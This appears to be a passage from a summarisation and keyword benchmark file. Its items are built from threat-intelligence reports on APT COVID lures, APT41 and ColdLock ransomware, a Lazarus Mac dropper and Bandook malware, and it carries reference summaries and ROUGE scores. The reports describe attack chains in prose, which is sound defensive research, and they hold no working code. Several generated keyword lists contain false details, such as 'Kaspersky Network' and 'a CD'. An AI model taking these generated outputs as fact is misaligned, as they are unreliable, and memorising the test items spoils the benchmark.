RTF file embedding k.dll20Looking at the Equation Native Stream, we can see that this DLL is made persistent by using the run registry key \u201cMicrosoft\\Windows\\CurrentVersion\\Run\u201d (Figure 29). In this case, \u201ck.dll\u201d is executed each time the system reboots.Figure 29: Equation native streamA code similarity check between \u201ck.dll\u201d and \u201cintel.wll\u201d showed that both have similar functionalities and the same exported function named \u201cEngdic\u201d.Chinese actor (Winnti) Another Chinese threat actor that used the Royal Road weaponization framework with a COVID-19 theme recently dropped a backdoor variant named Chinoxy by exploiting the equation editor vulnerability22, 23. Some evidence suggests that Winnti is the actor behind this campaign, but we cannot confirm it22, 24, 25.21Malicious LNK files LNK files are shortcut files used by Microsoft Windows. They are considered a Shell item type that can be executed. From 2013 on, attackers have used malicious LNK files to infect their victims. A few APTs started using malicious LNK with COVID-19 themes from late February to mid-March to ensnare victims.Mustang Panada Mustang Panda is a Chinese threat actor that has targeted NGOs (non-government organizations) since 2017. The group\u2019s main targets are US think tanks and NGO organizations in Mongolia. Mustang Panda uses spear phishing emails to initiate its attacks and usually drops either Poison Ivy or the PlugX RAT26, 27.In their COVID-19 phishing campaign, Mustang Panda sent an LNK file containing a malicious HTA application, which contained a VB script (Figure 30).Figure 30: HTA fileAPTs and COVID-19: How advanced persistent threats use the coronavirus as a lure22 2222In the properties of this LNK file, there is a command that will be executed when the file is opened (Figure 31).Figure 31: CommandThe command calls \u201cmshta.exe\u201d to execute the HTA application that drops and runs a payload. The payload has a resource that is dropped in the victim\u2019s machine. The final payload in this campaign is either a variant of PlugX RAT or Cobalt Strike. Higaisia Anomali has reported another threat group called Higaisia using malicious LNK files to perform malicious operations using COVID-19 themes. The actor sends an LNK file disguised as a PDF via spam campaigns. After opening the LNK file, an actual PDF file is opened28.It is assumed that the group behind this campaign is a North Korean actor targeting English speaking people/ organizations28.Opening the LNK file leads to execution of the command embedded in the property section (Figure 32). The command decodes an embedded base64 payload and drops it into the victim\u2019s machine.The dropped payload is a cabinet file that contains multiple files. The content of the cabinet file is extracted using the legitimate Windows executable \u201cextract.exe\u201d. From there, multiple stages are executed and finally, a variant of the PlugX RAT is dropped.Figure 32: CommandAPTs and COVID-19: How advanced persistent threats use the coronavirus as a lure23 2323Conclusion In this report, we provided an overview of various APT groups using the COVID-19 pandemic as a theme in several different types of malicious campaigns to increase the odds of their attacks\u2019 success. This shows that threat actors are closely monitoring public events happening around the world, and quickly employing those themes in attack vectors to take advantage of the opportunity. We expect that in the coming weeks and months, APT threat actors will continue to leverage this crisis to craft phishing campaigns using social engineering techniques and other malicious tactics embedded into lure documents to compromise their targets.The Malwarebytes Threat Intelligence team is monitoring the threat landscape and paying particular attention to attacks trying to abuse the public\u2019s fear of the COVID-19 crisis. Our business and consumer customers are protected from these attacks and more, thanks to our multi-layered detection engines.For more information about the threat landscape or how our products thwart advanced attacks, feel free to get in touch with us at intel@malwarebytes.com.Sources1. [Online]. Available: url abstracts/kimsuky-group-tracking-king-spear-phishing. 2. [Online]. Available: url intelligence/cve-2017-0199-new-malware-abuses-powerpoint-slide-show/. 3. [Online]. Available: url gamaredon-like-fancy-bear-and-cozy-bear-steps-up-cyberattacks-against- ukraine-others/. 4. [Online]. Available: url 5. [Online]. Available: url 6. [Online]. Available: url under-radar-for-years.html. 7. [Online]. Available: url apt36-jumps-on-the-coronavirus-bandwagon-delivers-crimson-rat/. 8. [Online]. Available: url 9. [Online]. Available: url 10. [Online]. Available: url of-global-outbreak-related-cyber-attacks/. 11. [Online]. Available: url actor-profile-ta505-dridex-globeimposter. 12. [Online]. Available: url threat-actor-profile-ta542-banker-malware-distribution-service. 13. [Online]. Available: url fears-seized-by-cybercriminals. 14. [Online]. Available: url continues-targeting-government-of-china-and-chinese-organizations.15. [Online]. Available: url 16. [Online]. Available: url 17. [Online]. Available: url 18. [Online]. Available: url 2019/#id1. 19. [Online]. Available: url group. 20. [Online]. Available: url covid-campaign/. 21. [Online]. Available: url royal-road.html. 22. [Online]. Available: url chinoxy. 23. [Online]. Available: url backdoor-using-covid19-document-lure-83fa294c0746. 24. [Online]. Available: url 25. [Online]. Available: url updates. 26. [Online]. Available: url 27. [Online]. Available: url 28. [Online]. Available: url being-utilized-by-threat-actors-of-varying-sophistication.Malwarebytes is a cybersecurity company that millions worldwide trust. Malwarebytes proactively protects people and businesses against malicious threats, including ransomware, that traditional antivirus solutions miss. The company\u2019s flagship product uses signature-less technologies to detect and stop a cyberattack before damage occurs. Learn more at www.malwarebytes.com. ", "generated_text": "APT; groups; North Korean; Velvet Chollima; APT37; Ocean Lotus; RTF exploits; Malicious macros; macros; macros; shellcode; system; browser vulnerabilities; Kalypso Group; Winnti; Mustang Panada; SC; spear; phishing emails; the coronavirus; March 2020; macros; a malware; Shellcode; surveillance; a command; control; servers; a downloader; a list; the group; CVE-2017-01992; The DPRK; US; Korean; targets; KHNP; DPRK; capabilities; the malware; detection; the coronavirus.", "ref_text": "<START-1>The white paper provides an overview of how various advanced persistent threat (APT) groups have been using the COVID-19 pandemic as a lure in cyberattacks. It categorizes the techniques used by these groups into four main types: template injection, malicious macros, RTF exploits, and malicious LNK files. Template injection refers to embedding a script in a document that fetches a remote malicious template. Groups like Kimsuky and Gamaredon have used COVID-19 themed documents with template injection to target victims. The malicious templates typically contain macros that collect system information and exfiltrate it. Embedding malicious macros directly in documents has been the most common technique. Groups like Kimsuky, Konni, APT36, Patchwork, Hades, TA505, TA542, Bitter, and Ocean Lotus have used macro-enabled COVID-19 themed documents that drop malware like remote access Trojans after being opened. The macros are usually obfuscated and decrypt malicious payloads. Some Chinese groups have used COVID-19 themed RTF files exploiting the equation editor vulnerability to drop backdoors. Calypso group and Winnti are examples of actors using this technique recently. Malicious LNK files have also been observed in campaigns by groups like Mustang Panda and Higaisia. Opening the LNK file leads to execution of the command embedded in the property section, which decodes an embedded base64 payload and drops it into the victim's machine. The dropped payload is a cabinet file that contains multiple files, and content is extracted using the legitimate Windows executable \"extract.exe\".The LNK files link to scripts that eventually drop remote access Trojans. In summary, the white paper provides an overview of how various sophisticated threat actors have quickly adopted COVID-19 themes and current events in their social engineering tactics and cyberattacks. Their techniques involve using the pandemic crisis as a lure in phishing emails and weaponized documents that infect systems with malware like remote access Trojans upon opening. <END-1>", "t5/keyword/hint_hit_precision": 0.21428571428571427, "t5/word/hint_hit_recall": 0.0429042904290429, "gpt3/lexical/rouge_rouge1": 0.36936936936936937, "gpt3/lexical/rouge_rouge2": 0.12217194570135746, "gpt3/lexical/rouge_rougeL": 0.23423423423423423, "gpt3/lexical/rouge_rougeLsum": 0.23423423423423423, "gpt3_generated_text": ["The white paper discusses how Advanced Persistent Threat (APT) groups, including North Korean Velvet Chollima (Kimsuky) and APT37, are using the global pandemic of the coronavirus as a lure to carry out cyberattacks. These threat actors are employing various techniques such as template injection, malicious macros, RTF exploits, and malicious LNK files to deliver malware to victim machines. For example, Kimsuky has been sending spear phishing emails with COVID-19 as the subject line, containing malicious documents weaponized with CVE-2017-01992 to exploit system vulnerabilities. The malware deployed by these APT groups includes spyware that collects and sends information to command and control servers. It is crucial for organizations to be vigilant and implement proper cybersecurity measures to protect against these threats exploiting the fear and uncertainty surrounding the coronavirus pandemic."]}, {"split_name": "val", "sample_id": "val_88", "prompt_text": "Extract the keywords: www.trendmicro.com /en_gb/research/20/i/u-s--justice-department-charges-apt41-hackers-over-global-cyberattacks.html U.S. Justice Department Charges APT41 Hackers over Global Cyberattacks \u22ee 9/18/2020APT & Targeted AttacksThe United States Justice Department announced that it was charging five Chinese citizens with hacking crimes committed against over 100 institutions in the United States and abroad. These five individuals were reportedly connected to the hacking group known as APT41.On September 16, 2020, the United States Justice Department announced that it was charging five Chinese citizens with hacking crimes committed against over 100 institutions in the United States and abroad. The global hacking campaign went after a diverse range of targets, from video game companies and telecommunications enterprises to universities and non-profit organizations. The five individuals were reportedly connected to the hacking group known as APT41. At the time of writing, they remain fugitives, but two Malaysian citizens have been arrested for aiding the hackers.Three related indictments unsealed by the Justice Department laid out the group's wide range of malicious activities, including crypto-jacking and ransomware attacks. Most of the activities appear to have been done for profit, but some were for espionage purposes.Justice officials say that the group's intrusions allowed the hackers to steal source code, customer account data, and personally identifiable information (PII). Other notable activities include defrauding video game companies by manipulating in-game resources, and launching a ransomware attack on the network of a non-profit organization dedicated to combating global poverty.The hackers used publicly available exploits and common vulnerabilities, which are listed in the official report. They also employed sophisticated hacking techniques to gain and maintain access to the victim's computer networks. The official report outlined how the team used \"supply chain attacks\" in which they compromised software providers and modified the code they were giving their customers. This also allowed the threat actors to compromise the customers and spread their influence further.This is not the first time that APT41 activities have been scrutinized \u2014 the group has been active for some time. Just last May, Trend Micro connected the group to ransomware attacks on Taiwanese organizations. The new ransomware family, which we dubbed ColdLock, is potentially destructive as it appears to target databases and email servers for encryption.The attack chain of ransomware incidents in TaiwanThe Trend Micro Research team investigated the ColdLock ransomware attack, which actually targeted the energy industry in Taiwan. The ransomware attack chain is outlined in Figure 1; however, we currently1/4do not know the initial arrival vector of this threat into a potential victim's network. Our analysis focused on the way the attacker spreads the ransomware to infect as many machines as possible.1. The threat actor enters a victim's network environment and obtains the account username andpassword of the company headquarters' active directory server.2. After logging in to the active directory server, the threat actor modifies the active directory servergroup policy object \u2014 this includes a request that all domain account members create a scheduled task and execute the malware.3. In the final step, the other subsidiary active directory servers and all the endpoint machines willdownload the scheduled task and execute the ransomware.Figure.1 The attacker uses an Active Directory (AD) scheduled task to deploy the ransomware in the customer environment.Scheduled tasks play a very important role in this incident. The threat actors use a scheduled task command to spread and infect a victim's environment. The screenshot in Figure 2 shows how the threat actor uses SMB and internal IIS Web Service to copy \"lc.tmp\" (the main ransomware loader in this incident) to other victims' host machines. After that, the PowerShell command executes the main ransomware loader.2/4Figure 2. How a scheduled task delivers the malware to a victim's environmentThe right tool for the jobBefore the ransomware attack, the attacker was likely already hiding in the victims' environments for some time. We found the same customized loaders installed as Windows services in every victim's environment, and those infected machines were in positions that allowed them to reach other machines under the subnets.The loaders decrypted the next-stage payloads, which were either embedded inside itself or stored on the disk as separate files. The next-stage payloads were CobaltStrike in this series of incidents. After the loader and payload pairs were successfully installed, the attacker started poking around the environments with tools like password dumpers and HTTP tunneling tools \u2014 then the ransomware attacks were launched one month later.More than just a single occurrenceDuring the investigation, we discovered more incidents that are possibly related to the one discussed above. We did this by checking the indicator overlap and the C&C infrastructure overlap. Based on the distribution of the linked indicators, the attacker(s) appears to be interested in energy, retail, and telecom companies, mainly in Southeast Asia. They mostly conduct espionage activities \u2014 lurking in the environments for a long period and packing the data that interested them. They also seem to be updating the backdoors and toolsets they use.Possible link to Chinese espionageThe C&C server 104[.]233[.]224[.]227 was hosted under a small hosting service with only 64 IPs under it. The IP range was registered to an address in Inner Mongolia, China. The C&C server was abandoned several days after the incidents, and now the IP is hosting a Simplified-Chinese site.Trend Micro Solutions3/4Sophisticated hacking groups have versatile tools and are persistent threats. Users should deploy more robust and proactive defenses to be adequately protected against these groups. The following Trend Micro Solutions are recommended:Trend Micro XDR for Users: Applies AI and analytics for earlier detection of threats across endpoints and other layers of the system Trend Micro Apex One\u2122: Provides actionable insights, expanded investigative capabilities, and centralized visibility across the network. Trend Micro\u2122 Deep Discovery\u2122 Email Inspector: Detects, blocks, and analyzes malicious email attachments through custom sandboxing and other detection techniquesTo help defend users against APT41 specifically, we have developed an assessment tool that can scan endpoints for file-based indicators collected from global intelligence sources.Indicators of CompromiseMalware FamilySHA-1 ", "generated_text": "the report; analysis; Trend Micro; 5 Chinese citizens; APT41; over 100 institutions; the United States; China; the group; access; vulnerabilities; common vulnerabilities; vulnerabilities; vulnerabilities; computer networks; the attackers; a scheduled task; the ransomware loader; CobaltStrike; CobaltStrike; a ransomware attack; Taiwanese; the attacker; the victims; compromised system; the loader; the system; the loader; the report; details; the group; the report; targets; the United States; software providers; infrastructure; the report; cyberattacks; espionage; the group; APT41 activities.", "ref_text": "<START-1>In September 2020, the U.S. Justice Department charged 5 Chinese citizens associated with the APT41 hacking group for cyberattacks on over 100 organizations globally. The hackers engaged in cryptojacking, ransomware attacks, theft of source code and PII, video game fraud, and more. They used public exploits and supply chain attacks to compromise targets. Trend Micro had connected APT41 to ransomware attacks on Taiwan organizations earlier in 2020. The ransomware, called ColdLock, spread via Active Directory and scheduled tasks. Further analysis found the group was lurking in target networks for months beforehand, using custom loaders and Cobalt Strike. They targeted energy, retail, telecom, and more in Southeast Asia. Infrastructure links suggest ties to Chinese espionage. APT41 has sophisticated tools and is a persistent threat, requiring robust defenses like AI-powered detection, sandboxing, and threat intelligence. In summary, the PDF covers the U.S. charges against APT41 hackers as well as previous research connecting them to wide-ranging cyberattacks and espionage, emphasizing the need for strong security measures. <END-1>", "t5/keyword/hint_hit_precision": 0.21951219512195122, "t5/word/hint_hit_recall": 0.07975460122699386, "gpt3/lexical/rouge_rouge1": 0.4545454545454545, "gpt3/lexical/rouge_rouge2": 0.11764705882352941, "gpt3/lexical/rouge_rougeL": 0.2662337662337662, "gpt3/lexical/rouge_rougeLsum": 0.2662337662337662, "gpt3_generated_text": ["The United States Justice Department has charged five Chinese citizens connected to the hacking group APT41 with cyberattacks on over 100 institutions in the United States and abroad. The group used common vulnerabilities to gain access to computer networks, steal source code, customer data, and personally identifiable information for profit and espionage purposes. They also launched ransomware attacks and manipulated in-game resources for financial gain. The attackers used sophisticated techniques, including supply chain attacks on software providers to compromise their customers' systems. Trend Micro's analysis of a ransomware attack on Taiwanese organizations revealed the use of CobaltStrike as a payload delivered through scheduled tasks, allowing the attackers to infect multiple machines in the victims' environments. This incident is part of a series of related incidents possibly orchestrated by the same group, highlighting the ongoing threat posed by APT41 activities."]}, {"split_name": "val", "sample_id": "val_89", "prompt_text": "Extract the keywords: ESET research  ESETresearch ESETresearch  BREAKING A signed Mac executable disguised as a job description for Coinbase was uploaded to VirusTotal from Brazil . This is an instance of Operation In(ter)ception by  Lazarus for Mac.@pkalnai @dbreitenbacher1/74:51 PM \u00b7 Aug 16, 2022 \u00b7  witter Web App140Retweets15Quote  weets281Likes\u00b7 ESETresearch Aug 16ESET research Replying to  ESETresearch Malware is compiled for both Intel and Apple Silicon. It drops three files: a decoy PDF document Coinbase_online_careers_2022_07.pdf, a bundle FinderFontsUpdater.app and a downloader safarifontagent. It is similar to  ESETresearch discovery in May. 2/7ESET research  ESETresearch\u00b7 May 4 ESETresearch A year ago, a signed Mach-O executable disguised as a job description was uploaded to VirusTotal from Singapore . Malware is compiled for Intel and Apple Silicon and drops a PDF decoy. We think it was part of  Lazarus campaign for Mac. @pkalnai @marc_etienne_ 1/8 Show this thread1213\u00b7 ESETresearch Aug 16ESET research However, this time the bundle is signed July 21 (according to the timestamp) using a certificate issued in February 2022 to a developer named Shankey Nohria and team identifier 264HFWQH63. The application is not notarized and Apple has revoked the certificate on August 12. 3/71112 ESETresearch Aug 16ESET research Another change is in the downloader, safarifontagent, as it connects to a different C&C server (url The C&C\u00b7server did not respond at the time we analyzed this threat. 4/71310 ESETresearch Aug 16ESET research The Windows counterpart of this threat dropping the exact same decoy (2B4E8F1927927BDC2F71914BA1F12511D9B6BDBDB2DF390E267F54DC 4F8919DD) was spotted August 4 by\u00b7@h2jazi. 5/7\u00b7 Aug 4Jazi @h2jazi The decoy pdf is \"Engineering Manager, Product Security\" job description at Coinbase. Next stage: (gone!) url twitter.com/h2jazi/status/\u20261210ESET research ESETresearch Aug 16\u00b7IoCs: 6/71510 ESETresearch Aug 16ESET research url OSX/NukeSped.N  ESETresearch 7/7\u00b728@pwnsdx Aug 17\u00b7Sabri Replying to That's problematic ESETresearch @pkalnai@deeffcaf Aug 17 ESETresearch @pkalnai\u00b7deeffcaf Replying to Got iT.@plaero3 Aug 18\u00b7plaero Replying to @threadreaderapp ESETresearch @pkalnaiunroll pleaseand@dbreitenbacherand@dbreitenbacherand@dbreitenbacher1Thread Reader App@threadreaderapp Aug 18\u00b7 ", "generated_text": "PDF; malware; Mac; a job description; Coinbase; the decoy PDF; the document; a CD; July 21; the decoy; the installer; SafariFontagent; the command; control; the payload; the second stage; a decoy PDF; a bundle; FinderFontsUpdater.app; Safarifontagent; a CD; the malware; October 2022; a developer; Shankey Nohria; a certificate; May; this threat; the same decoy; Mach-O; the third stage; the PDF; the decoy; the RAR filenames; a decoy PDF; the name; the downloader; the same C&C server; the first stage; the mac; the decoy.", "ref_text": "<START-1>ESET researchers discovered a new malware campaign targeting Mac users that is attributed to the Lazarus threat group. On August 16, 2022, ESET announced on Twitter that a signed Mac executable disguised as a Coinbase job description was uploaded to VirusTotal from Brazil. This is similar to a campaign ESET uncovered in May 2022 originating from Singapore. The malware is compiled for both Intel and Apple Silicon architectures. It drops three files: a PDF job description decoy, a bundle called FinderFontsUpdater.app, and a downloader called safarifontagent. The bundle is signed with a certificate issued in February 2022 that Apple revoked on August 12, 2022. Unlike the May campaign, this version connects to a different command and control server at concrecapital[.]com. The server did not respond when analyzed. On August 4, 2022, another security researcher found a Windows version dropping the same PDF and connecting to a different C2. ESET believes this new activity is part of Lazarus' Operation In(ter)ception campaign targeting Mac users. The malware bypasses security products by disguising itself as a legitimate job application. The use of code signing and targeting of cryptocurrency companies indicates the likely purpose is cyberespionage and financial theft. ESET provided hashes for the dropped files and C2 domain to help identify infections. They assess this demonstrates Lazarus' continued efforts to breach MacOS devices through social engineering and Trojanized applications. <END-1>", "t5/keyword/hint_hit_precision": 0.24390243902439024, "t5/word/hint_hit_recall": 0.05752212389380531, "gpt3/lexical/rouge_rouge1": 0.5721649484536083, "gpt3/lexical/rouge_rouge2": 0.2590673575129534, "gpt3/lexical/rouge_rougeL": 0.365979381443299, "gpt3/lexical/rouge_rougeLsum": 0.365979381443299, "gpt3_generated_text": ["The ESET research team recently discovered a signed Mac executable disguised as a job description for Coinbase, uploaded to VirusTotal from Brazil, in an instance of Operation In(ter)ception by Lazarus for Mac. The malware, compiled for both Intel and Apple Silicon, drops three files: a decoy PDF document named Coinbase_online_careers_2022_07.pdf, a bundle FinderFontsUpdater.app, and a downloader named Safarifontagent. This threat is similar to a previous discovery in May by ESET research. The bundle was signed on July 21 using a certificate issued to a developer named Shankey Nohria, with a team identifier of 264HFWQH63, although Apple has since revoked the certificate. The downloader Safarifontagent connects to a different command and control server, and the Windows counterpart of this threat was also detected dropping the same decoy PDF. This threat poses a significant risk to Mac users and highlights the ongoing efforts of cybercriminals to target Apple devices with sophisticated malware."]}, {"split_name": "val", "sample_id": "val_90", "prompt_text": "Extract the keywords: 11/30/2020Bandook: Signed & Delivered - Check Point ResearchBandook: Signed & Deliveredresearch.checkpoint.com/2020/bandook-signed-deliveredNovember 26, 2020November 26, 2020IntroductionCheck Point Research recently observed a new wave of campaigns against various targets worldwide that utilizes a strain of a 13-year old backdoor Trojan named Bandook.Bandook, which had almost disappeared from the threat landscape, was featured in 2015 and 2017 campaigns, dubbed \u201cOperation Manul\u201d and \u201cDark Caracal\u201c, respectively. These campaigns were presumed to be carried out by the Kazakh and the Lebanese governments, as uncovered by the Electronic Frontier Foundation (EFF) and Lookout.During this past year, dozens of digitally signed variants of this once commodity malware started to reappear in the threat landscape, reigniting interest in this old malware family.In the latest wave of attacks, we once again identified an unusually large variety of targeted sectors and locations. This further reinforces a previous hypothesis that the malware is not developed in-house and used by a single entity, but is part of an offensive infrastructure sold by a third party to governments and threat actors worldwide, to facilitate offensive cyber operations.In this publication, we showcase the latest evolution of the infection chain offered by this unknown third-party, compare the different Bandook variants, and share the various techniques its creators use to hinder analysis and detection of all the components in the attack flow.Infection ChainAs the infection chain is constantly evolving, we describe the one used by the attackers from as early as July, to the present day.The full infection chain of the attack can be broken down into three main stages. The first stage starts, as in many other infection chains, with a malicious Microsoft Word document delivered inside a ZIP file. Once the document is opened, malicious macros are downloaded using the external template feature. The macros\u2019 code in turn drops and executes the second stage of the attack, a PowerShell script encrypted inside the original Word document. Finally, the PowerShell script downloads and executes the last stage of the infection: the Bandook backdoor.The names of the various artifacts described below may vary from one infection to the next.First Stage \u2013 Lure Documentsurl 1: Full infection chain.1/711/30/2020Bandook: Signed & Delivered - Check Point ResearchThe first stage starts with a Microsoft Word document with embedded encrypted malicious script data and an external template that points to a document containing malicious VBA macros.The external template is downloaded via a URL shortening web service like TinyURL or Bitly, which redirects to another domain controlled by the attacker.The external template document contains a VBA code that runs automatically, decrypts the embedded data from the original lure document, and drops the decoded data into two files in the local user folder: fmx.ps1 (the next stage PowerShell) and sdmc.jpg (base64 encoded PowerShell code).To allow this behavior, the attackers use a combination of two techniques: encrypted data is embedded inside a shape object within the original document (hidden from view by a small font size and white foreground), and is accessed from the external template code by using the following code:o4QQLW7zXjLbj = ActiveDocument.Shapes(1).TextFrame.TextRange.TextFor proper analysis, both the original document and the external template must be located, which makes things a bit more difficult for investigators.We observed and analyzed multiple pairs of documents and external templates. Different lure images were used, alongside different encryption keys.Examples of lure documents:Examples of external templates with macros:Figure 2: Lure documents used to convince the user to enable the macros.The external templates are not visible to the victim. Their only purpose is to provide malicious macros.Figure 3: External templates containing malicious macros.Interestingly, with each attack, after a certain amount of time, the attacker switched the malicious external template to a benign one, further muddying our analysis of the infection chain.Here again, the external templates look like random benign documents:The themes of the documents are often of cloud-based services like Office365, OneDrive and Azure that contain images of other documents supposedly available once the victim clicks \u201cEnable Content.\u201dFor example, one of the documents that specifically got our attention depicts an Office365 logo and a preview of a certificate issued by the government of Dubai. JAFZA \u2013 Jebel Ali Free Zone, featured at the top of the document, is an industrial area surrounding the port of Jebel Ali in Dubai, where more than 7,000 global companies are based.Figure 4: Benign external templates.Sample document file names:url 5: Lure document (left) and an example of a similar publicly available certificate (right).2/711/30/2020Bandook: Signed & Delivered - Check Point ResearchMalaysia Shipment.docx Jakarta Shipment.docx malta containers.docx Certified documents.docx Notarized Documents.docx bank statement.docx passport and documents.docx Case Draft.docx documents scan.docxSecond Stage \u2013 PowerShell LoaderAfter the VBA code drops the two files ( fmx.ps1 and sdmc.jpg ), it invokes fmx.ps1 .fmx.ps1 is a short PowerShell script that decodes and executes a base64 encoded PowerShell stored in the second dropped file ( sdmc.jpg ).First, the decoded PowerShell script downloads a zip file containing four files from a cloud service such as Dropbox, Bitbucket or an S3 bucket. The zip file is stored in the user\u2019s Public folder, and the four files are locally extracted.Figure 6: Malware components stored on Dropbox.com.Three of the files, a.png , b.png and untitled.png , are used by the PowerShell script to generate the malware payload in the same folder. untitled.png , unlike the other two files, is in a valid image format. It contains a hidden RC4 function encoded in the RGB values of the pixels, created using a known tool named invoke-PSImage.Figure 7: Malware components after being extracted on the victim\u2019s device.The final executable payload is concatenated from the following files:a.png \u2013 After it is decrypted using RC4 and stored as aps.png . b.png \u2013 As is.Finally, the PowerShell script executes the malware, opens draft.docx , and deletes all previous artifacts from the Public folder.draft.docx is a benign document whose sole purpose is to convince the victim that the document is no longer available, and that the overall execution was successful.Third Stage \u2013 The Bandook LoaderThe final payload in this infection chain is a variant of an old full-featured RAT named Bandook. Written in both Delphi and C++, Bandook has a long history, starting in 2007 as a commercially available RAT that was developed by a Lebanese individual nicknamed PrinceAli. Over time, several variants of the malware builder were leaked to the Web, and the malware became publicly available for download.Figure 8: Final document shown to the user post-infection.url 9: Bandook\u2019s history described on a hacking forum.11/30/2020Bandook: Signed & Delivered - Check Point ResearchBandook\u2019s execution flow starts with a loader, written in Delphi, that uses the Process Hollowing technique to create a new instance of an Internet Explorer process and inject a malicious payload into it. The payload contacts the C&C sever, sends basic information about the infected machine, and waits for additional commands from the server.The variant of the Bandook malware we observed in this attack was not one of the variants whose builder was previously leaked to the Web (which supported a range of more than 100 commands).In this attack, the threat actor utilized a custom, slimmed-down version of the malware with only 11 supported commands, including:File operations File executionFor a full list of commands and their corresponding request codes, see Appendix A.In this version, the communication protocol with the C&C server was also upgraded to use AES encryption.Bandook variants in the wildAfter comparing the Bandook variant we observed in the attack with the ones created by different leaked builders, we began hunting for variants more similar to the ones we observed.Our search led us to tweets by the MalwareHunterTeam (MHT) from 2019-2020 that mention various Bandook samples \u2014 all of them digitally signed with certificates that were issued by Certum.In the newer attack flows we observed, we once again found valid Certum certificates were used to sign the Bandook malware executable.Figure 10: Signed Bandook samples discovered by MHT.Figure 11: Valid signature information of a newly discoveredBandook sample.Analyzing all Bandook samples noted by MHT, we discovered that the very first of the samples was compiled in March 2019 and supported around 120 commands. A sample compiled a few days later \u2013 a different signed Bandook variant (with only 11 commands) utilized the very same C&C server. Since then, all signed samples use only 11 basic commands. The shared C&C provides clear evidence that both the slimmed-down and the fully-fledged variants of the malware are operated by a single attacker.In addition to the Bandook samples that were reported by MHT, we identified additional samples from the same time period (2019-2020) which were not digitally signed and contained about 120 commands. These were the only ITW Bandook samples we were able to locate from this time period.Several factors led us to believe that these signed and unsigned variants are specially crafted Bandook variants, used and developed by the same entity.Both use the same domain registration services for their C&C domains: Porkbun or NameSilo. They share a similar method of communication, using the AES encryption algorithm in CFB mode, with a hardcoded IV: 0123456789123456. This feature is not available in the public leaks of this malware. They incorporated commands that we did not observe in any other public leak or report. Most notable are the commands to execute Python and Java payloads.url Signed & Delivered - Check Point ResearchAt this point, we have three different variants of the malware, which we believe are operated and sold by a single entity, in accordance with their chronological appearance:Figure 12: Bandook subroutine to execute a precompiled Python from a file named \u201cdpx.pyc\u201d.1. A full-fledged version with 120 commands (not signed). 2. A full-fledged version (single sample) with 120 commands (signed). 3. A slimmed-down version with 11 commands (signed).The move to a slimmed-down version with only 11 commands for signed executables may indicate the operators\u2019 desire to reduce the malware\u2019s footprint and maximize their chances for an undetectable campaign against high profile targets (and high paying customers), while continuing the use of the un-signed 120 commands variant for lower profile ones.Furthermore, such a minimized backdoor might indicate that the slimmed-down variant of Bandook is only utilized as a loader for an additional, more full-featured malware to be downloaded next.TargetingAs mentioned previously, in this campaign we observed an unusually large variety of targeted sectors and locations. This strengthens a hypothesis made by researchers \u2013 that the malware is not being developed and used by a single entity, but an offensive infrastructure is being sold by a third-party, to governments and threat actors worldwide, to facilitate offensive cyber operations.The different targeted sectors include:Government, financial, energy, food industry, healthcare, education, IT and legal institutions.In the following countries:Singapore, Cyprus, Chile, Italy, USA, Turkey, Switzerland, Indonesia and Germany.Connection to Dark CaracalThis campaign isn\u2019t the first instance of the Bandook malware incorporated in a targeted attack. As mentioned, in a joint report from Lookout and the EFF, targeted attacks utilizing a Bandook variant, called \u201cDark Caracal\u201d, were attributed to the Lebanese General Security Directorate.Some of this campaign\u2019s characteristics and similarities to previous campaigns leads us to believe that the activity we describe in this report is indeed the continuation and evolution of the infrastructure used during the Dark Caracal operation:The use of the same certificate provider (Certum) throughout the various campaigns. The use of the Bandook Trojan, in what appears to be a unique evolving fork from the same source code (which is not known to be publicly available). Samples from the Dark Caracal campaign (2017) utilized around 100 commands, compared to the current 120 command version we analyzed. This wave of attacks shares the same anomalous characteristics for targeted attacks \u2013 an extreme variance in the selected targets, both in their industry and their geographic spread.Finally, EFF researchers who first disclosed the Dark Caracal operation also believe that the same attacker \u201cis back at it\u201d again.ConclusionAll evidence points to our belief that the mysterious operators behind the malicious infrastructure of \u201cOperation Manul\u201d and \u201cDark Caracal\u201d are still alive and operational, willing to assist in the offensive cyber operations to anyone who is willing to pay.Although not as capable, nor as practiced in operational security like some other offensive security companies, the group behind the infrastructure in these attacks seems to improve over time, adding ", "generated_text": "the malware; Bandook; a new wave; campaigns; 2015; 2017; targets; the Kazakh; Lebanon; The first stage; a Microsoft Word document; malicious macros; the external template; PowerShell script; a PowerShell script; the second stage; the Bandook backdoor; the malware; detection; the attackers; lure images; encryption keys; the malicious external template; organizations; the malware; Russian; Kazakhstan; the attacks; the Russian; the Malware; compromise; the targets; the Kaspersky Network; the malware; detection; cyber operations; response; the threat actors; the network; order.", "ref_text": "<START-1>The document is about a malware named Bandook that is used in a targeted attack. Bandook has a modular architecture and rich feature set including keylogging, screen captures, credential theft etc. It uses a loader written in Delphi and payload injected into Internet Explorer. It consists of three stages: Lure Documents, PowerShell Loader, and the Bandook Loader. The first stage starts with a Microsoft Word document containing malicious script data and an external template. The second stage decodes and executes a base64 encoded PowerShell stored in the second dropped file. The third stage is the final payload, which is a variant of an old full-featured RAT named Bandook. The malware uses the Process Hollowing technique to create a new instance of an Internet Explorer process and inject a malicious payload into it. The payload contacts the C&C server, sends basic information about the infected machine, and waits for additional commands from the server. The variants of the Bandook malware share similar methods of communication and incorporate commands that are not available in any other public leak or report. The authors believe that the same attacker who operated during the Dark Caracal operation is behind this malware infrastructure and is still active and willing to assist in cyber operations. <END-1>", "t5/keyword/hint_hit_precision": 0.15, "t5/word/hint_hit_recall": 0.07211538461538461, "gpt3/lexical/rouge_rouge1": 0.37770897832817335, "gpt3/lexical/rouge_rouge2": 0.0996884735202492, "gpt3/lexical/rouge_rougeL": 0.21671826625386995, "gpt3/lexical/rouge_rougeLsum": 0.21671826625386995, "gpt3_generated_text": ["This article discusses the resurgence of the Bandook malware in a new wave of campaigns targeting various organizations worldwide. Originally featured in campaigns in 2015 and 2017 linked to the Kazakh and Lebanese governments, Bandook has reappeared with digitally signed variants indicating it is part of an offensive infrastructure sold to governments and threat actors. The infection chain involves a Microsoft Word document with malicious macros, an external template, and a PowerShell script that downloads the Bandook backdoor. The attackers use techniques such as encrypted data embedded in shape objects and switching to benign external templates to hinder analysis. The malware is believed to be used by multiple entities for offensive cyber operations."]}, {"split_name": "val", "sample_id": "val_91", "prompt_text": "Extract the keywords: 5/26/2020On June 17, learn detection strategies for Process Injection\u2014the #1 most prevalent ATT&CK\u00ae technique we've seen to date.LEARN MOREBlue Mockingbird activity mines Monero cryptocurrencyCONTACT USIntroducing Blue MockingbirdRed Canary Intel is monitoring a potentially novel threat that is deploying Monero cryptocurrency-mining payloads on Windows machines at multiple organizations.MAY 7, 2020 